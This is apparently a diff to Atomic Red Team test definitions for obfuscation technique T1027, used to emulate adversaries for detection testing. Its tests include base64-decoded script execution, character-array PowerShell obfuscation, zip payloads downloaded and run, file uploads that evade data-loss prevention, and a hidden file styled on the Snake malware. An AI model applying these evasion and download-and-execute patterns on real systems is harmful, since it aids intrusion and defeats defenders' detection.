@@ -1,21 +1,39 @@
 attack_technique: T1027
-display_name: Obfuscated Files or Information
+display_name: "Obfuscated Files or Information"
 atomic_tests:
 - name: Decode base64 Data into Script
   auto_generated_guid: f45df6be-2e1e-4136-a384-8f18ab3826fb
   description: |
     Creates a base64-encoded data file and decodes it into an executable shell script
 
-    Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
+    Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` 
+    and uname -v
   supported_platforms:
   - macos
   - linux
+  input_arguments:
+    shell_command:
+      description: command to encode
+      type: string
+      default: "echo Hello from the Atomic Red Team && uname -v"
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      encode the command into base64 file
+    prereq_command: |
+      if [ -e "/tmp/encoded.dat" ]; then exit 0; else exit 1; fi
+    get_prereq_command: |
+      if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64encode -r -"; else cmd="base64"; fi;
+      echo "#{shell_command}" | $cmd > /tmp/encoded.dat
   executor:
     command: |
-      sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat"
-      cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
+      if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64decode -r"; else cmd="base64 -d"; fi;
+      cat /tmp/encoded.dat | $cmd > /tmp/art.sh
       chmod +x /tmp/art.sh
       /tmp/art.sh
+    cleanup_command: |
+      rm /tmp/encoded.dat 
+      rm /tmp/art.sh
     name: sh
 - name: Execute base64-encoded PowerShell
   auto_generated_guid: a50d5a97-2531-499e-a1de-5544c74432c6
@@ -28,7 +46,7 @@ atomic_tests:
   input_arguments:
     powershell_command:
       description: PowerShell command to encode
-      type: String
+      type: string
       default: Write-Host "Hey, Atomic!"
   executor:
     command: |
@@ -49,15 +67,15 @@ atomic_tests:
   input_arguments:
     registry_key_storage:
       description: Windows Registry Key to store code
-      type: String
+      type: string
       default: HKCU:Software\Microsoft\Windows\CurrentVersion
     powershell_command:
       description: PowerShell command to encode
-      type: String
+      type: string
       default: Write-Host "Hey, Atomic!"
     registry_entry_storage:
       description: Windows Registry entry to store code under key
-      type: String
+      type: string
       default: Debug
   executor:
     command: |
@@ -80,25 +98,25 @@ atomic_tests:
   input_arguments:
     url_path:
       description: url to download Exe
-      type: Url
+      type: url
       default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      T1027.exe must exist on disk at $env:temp\temp_T1027.zip\T1027.exe
+      T1027.exe must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe
     prereq_command: |
-      if (Test-Path $env:temp\temp_T1027.zip\T1027.exe) {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe") {exit 0} else {exit 1}
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
-      Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027.zip" -UseBasicParsing
+      Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\" -Force
   executor:
     command: |
-      "%temp%\temp_T1027.zip\T1027.exe"
+      "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe"
     cleanup_command: |
       taskkill /f /im calculator.exe >nul 2>nul
-      rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul
-      del /Q "%temp%\T1027.zip" >nul 2>nul
+      taskkill /f /im CalculatorApp.exe >nul 2>nul
     name: command_prompt
 - name: DLP Evasion via Sensitive Data in VBA Macro over email
   auto_generated_guid: 129edb75-d7b8-42cd-a8ba-1f3db64ec4ad
@@ -110,23 +128,23 @@ atomic_tests:
   input_arguments:
     input_file:
       description: Path of the XLSM file
-      type: Path
+      type: path
       default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
     sender:
       description: sender email
-      type: String
+      type: string
       default: test@corp.com
     receiver:
       description: receiver email
-      type: String
+      type: string
       default: test@corp.com
     smtp_server:
       description: SMTP Server IP Address
-      type: String
+      type: string
       default: 127.0.0.1
   executor:
     command: |
-      Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments #{input_file} -SmtpServer #{smtp_server}
+      Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments "#{input_file}" -SmtpServer #{smtp_server}
     name: powershell
 - name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
   auto_generated_guid: e2d85e66-cb66-4ed7-93b1-833fc56c9319
@@ -138,15 +156,15 @@ atomic_tests:
   input_arguments:
     input_file:
       description: Path of the XLSM file
-      type: Path
+      type: path
       default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
     ip_address:
       description: Destination IP address
-      type: String
+      type: string
       default: 127.0.0.1
   executor:
     command: |
-      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}
+      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body "#{input_file}" -UseBasicParsing
     name: powershell
 - name: Obfuscated Command in PowerShell
   auto_generated_guid: 8b3f4ed6-077b-4bdd-891c-2d237f19410f
@@ -169,11 +187,11 @@ atomic_tests:
   input_arguments:
     remote_file:
       description: URL of file to download
-      type: Url
+      type: url
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
     local_path:
-      description: Local path/filename to save the dowloaded file to
-      type: Path
+      description: Local path/filename to save the downloaded file to
+      type: path
       default: Atomic-license.txt
   executor:
     steps: |
@@ -186,3 +204,63 @@ atomic_tests:
       2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.
 
     name: manual
+- name: Snake Malware Encrypted crmlog file
+  auto_generated_guid: 7e47ee60-9dd1-4269-9c4f-97953b183268
+  description: |
+    The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.
+    [Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $file = New-Item $env:windir\registration\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host "File created: $($file.FullName)"
+    cleanup_command: |
+      $fileNameToDelete = '04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'; $filePathToDelete = "$env:windir\registration\"; $fullPathToDelete = Join-Path $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host "File deleted: $fullPathToDelete" } else { Write-Host "File not found: $fullPathToDelete" }
+    name: powershell
+    elevation_required: true
+- name: Execution from Compressed JScript File
+  auto_generated_guid: fad04df1-5229-4185-b016-fb6010cd87ac
+  description: |
+    Mimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcanary.com/blog/gootloader/
+  supported_platforms:
+  - windows
+  input_arguments:
+    url_path:
+      description: url to download JScript file
+      type: url
+      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/t1027js.zip
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      T1027.js must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js
+    prereq_command: |
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip" -UseBasicParsing
+      Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\" -Force
+  executor:
+    command: |
+      "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js"
+    cleanup_command: |
+      taskkill /f /im calculator.exe >nul 2>nul
+    name: command_prompt
+- name: Obfuscated PowerShell Command via Character Array
+  auto_generated_guid: 6683baf0-6e77-4f58-b114-814184ea8150
+  description: |
+    Spawns a child PowerShell process using character array obfuscation. 
+    Both the PowerShell binary name and executed command are constructed 
+    from ASCII values at runtime to evade string-based detection.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $ps = [char[]](112,111,119,101,114,115,104,101,108,108)
+      $cmd = [char[]](83,116,97,114,116,45,80,114,111,99,101,115,115,32,99,97,108,99,46,101,120,101)
+      & (-join $ps) "-Command" (-join $cmd)
+    cleanup_command: |
+      taskkill /f /im calculator.exe >nul 2>nul
+      taskkill /f /im CalculatorApp.exe >nul 2>nul
+    name: powershell
+
